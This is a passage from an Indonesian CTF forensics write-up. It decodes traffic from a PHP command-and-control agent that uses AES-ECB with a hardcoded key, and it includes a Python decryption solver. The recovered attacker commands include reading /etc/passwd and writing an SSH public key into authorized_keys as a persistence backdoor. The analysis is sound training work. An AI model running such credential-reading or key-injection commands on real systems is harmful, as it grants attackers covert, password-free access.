lM2bHdlUDNtdVEwd2VmdnlkR1hOL3ExVWJJMENkZlVHc1JNYWFvWm9GWTlORFNNWU90aVlrZnF3RWIzRDh6YjJyNzJwMmg2a21rUWpnMmpkZjZ4LytpZUdwWjlRMHJwS0xSL0d0S3l2QytvVXpXdEdTc0l5OXRLMlBQQUhUQ0Y1VFByTnFzMnJJYStOamU3b2g1MktMUGNCZlY5cCs4aE5PdEgxR0lsNFBmM000WWNMOW9lb3l5d2g0RU52cG5mWUx6THNsbDFVNzQzMVJBY3Q3Z0FyaDlGTFpQYytXUjMwcXhudWZ5RzBYUWNaV3paZmNzQ1RVK3lSWlJqWW5lU1FSQnRPZWJLd256OUtRSHNHcEdURVhPMVU1WndnbFhwdw%3D%3D HTTP/1.0
Host: 192.168.1.12
Connection: close


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 32
Connection: close

cUZsL2loS0p2ZTVOVkRrbERtVHo5Zz09
```

* * *

## 🧩 Step 2 – Analisis agent.php

Saat dianalisis, file ini ternyata adalah **custom C2 agent berbasis PHP**.

### Karakteristik utama:

-   Menggunakan **AES-128-ECB**
    
-   Key hardcoded:
    

```php
$key = "ctfkey1234567890";
```

-   Fungsi enkripsi:
    

```php
function encrypt_data($data, $key, $method)
{
    return base64_encode(openssl_encrypt($data, $method, $key));
}
```

-   Fungsi dekripsi:
    

```php
function decrypt_data($data, $key, $method)
{
    return openssl_decrypt(base64_decode($data), $method, $key);
}
```

* * *

### 🔥 Insight Penting

Dari sini kita dapat memahami alur komunikasi:

1.  Agent request ke C2:
    

```
?gid=victim1&classid=poll
```

2.  C2 mengirim command dalam bentuk:
    

```
base64(AES(command))
```

3.  Agent:
    

-   decode base64
    
-   decrypt AES
    
-   execute command
    

4.  Output dikirim balik:
    

```
base64(AES(output))
```

* * *

## 🧩 Step 3 – Identifikasi Encoding Layer

Awalnya decoding dilakukan dengan 1x base64 + AES → hasilnya **gibberish** ❌

Setelah analisis lebih dalam, ditemukan bahwa data menggunakan:  
👉 **DOUBLE BASE64 ENCODING**

Flow sebenarnya:

```
base64(
    base64(
        AES(command)
    )
)
```

* * *

## 🧩 Step 4 – Membuat Solver

Script Python untuk decode:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = b"ctfkey1234567890"

def decrypt_only(data_b64):
    # decode outer
    outer = base64.b64decode(data_b64)

    # decode inner
    inner = base64.b64decode(outer)

    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(inner)

    try:
        decrypted = unpad(decrypted, 16)
    except:
        pass

    return decrypted


data = "UTVNL0dSQmVJK0FUTVJQbHV4eTJicHZXOCtRbTdpUHdjUGl1TjFaTnAyWnFVdFZqYzVZL3Q5Nnd5bWxneEQ2Z2UrL3dqU3FUK1dmVkV2SGVybEVQdm9qUC9PNzFERVMxbTU2czVzc1B3a3hoTkFxcllHSlZxampxNE1uaG5ueUJIaG5tODErSTJSYnNZVERlelc5VmZHWksrRmx1ZzJDekxaNFpGaGNyb0pYWWg3Z2RQa3htSE1YT2ZZeHJMQklSTk9zc2VjdWxFdXU0SnlBVDZsTXFYK0sweEJxdUViM3UwcTdhNFJtODBkQUl2eDhndGc5dWpzUzNDZ3krV2JmeFFoYkNqM3hvUHljWSthOGV1c1hTbXc9PQ=="

out = decrypt_only(data)

print(out.decode(errors="ignore"))
```

* * *

## 🧩 Step 5 – Recover Command Sequence

Hasil dekripsi:

```
id
pwd
ls -la

cat /etc/passwd

mkdir -p /home/aria/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBWOva1ZYUQ8FvZXcCu4b+VDLU0R4qVjs4sIkK4yUpdA root@ms.ariaf.my.id" > /home/aria/.ssh/authorized_keys
```

* * *

## 🧩 Step 6 – Analisis Persistence Mechanism

Command terakhir menunjukkan attacker melakukan:

👉 **SSH Persistence (Backdoor Access)**

Dengan cara:

-   Membuat direktori `.ssh`
    
-   Menambahkan public key ke `authorized_keys`
    

Ini memungkinkan attacker login tanpa password.

* * *

## 🏁 Final Answer

Command terakhir:

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBWOva1ZYUQ8FvZXcCu4b+VDLU0R4qVjs4sIkK4yUpdA root@ms.ariaf.my.id" > /home/aria/.ssh/authorized_keys
```

* * *

## 🧠 Insight & Lessons Learned

-   Jangan langsung asumsi encoding → selalu cek kemungkinan multi-layer
    
-   ECB mode sering muncul di malware sederhana
    
-   C2 agent PHP biasanya:
    
    -   polling-based
        
    -   simple encryption
        
-   Persistence paling umum:
    
    -   SSH key injection
        
    -   cronjob
        
    -   webshell
        

* * *

### 🔥 Kalau kalian ada pertanyaan atau sesuatu yang janggal, langsung contact aku yaa. Boleh lewat instagram atau pakai fitur secure messaging di contact <3
